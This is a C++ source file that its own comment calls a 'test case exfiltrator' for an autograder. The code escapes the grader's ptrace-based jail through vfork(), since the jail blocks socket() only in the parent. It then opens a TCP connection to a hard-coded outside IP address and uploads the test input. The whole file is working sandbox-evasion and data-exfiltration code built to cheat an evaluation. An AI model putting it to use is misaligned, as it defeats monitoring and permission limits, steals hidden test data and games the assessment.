/**
	Socket-based test case exfiltrator
	Opens a socket to a remote server and uploads the input
	
	There is extra complexity because the autograder prevents calls to socket() directly. However, it does not prevent
	calls to vfork(), and the child process can call socket(). Because of the undefined behavior of vfork(), there
	is a segfault when the process ends, but that doesn't matter.
**/

#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <netinet/ip.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <arpa/inet.h>

using namespace std;

void breakCipher(char *str) {
	//break out of the ptrace-based jail
	pid_t pid = vfork();
	if (pid < 0) {
		strcpy(str, "V1");
		return;
	}

	if (pid == 0) {
		//V1 child
		int ret;

		//open a TCP socket
		auto sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock < 0) {
			cout << strerror(errno) << endl;
			strcpy(str, "AA");
			_exit(0);
		}

		//some stuff to make it easier to reuse the address later
		int yes = 1;
		ret = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, 4);
		if (ret < 0) {
			strcpy(str, "BB");
			_exit(0);
		}

		//set up which server we want to connect to, and on what port
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(3778);
		addr.sin_addr.s_addr = inet_addr("52.2.174.86");

		//open a connection to the server
		ret = connect(
			sock,
			(sockaddr*)&addr,
			sizeof(addr)
			);
		if (ret < 0) {
			strcpy(str, "CC");
			_exit(0);
		}

		//upload!
		ret = send(sock,
			str,
			strlen(str),
			0
			);
		if (ret == 0) {
			strcpy(str, "DD");
			_exit(0);
		}
		if (ret < 0) {
			strcpy(str, "EE");
			_exit(0);
		}

		//a call to _exit(0) here would probably prevent the segfault.
	}
	else {
		//V1 parent
	}
	
}
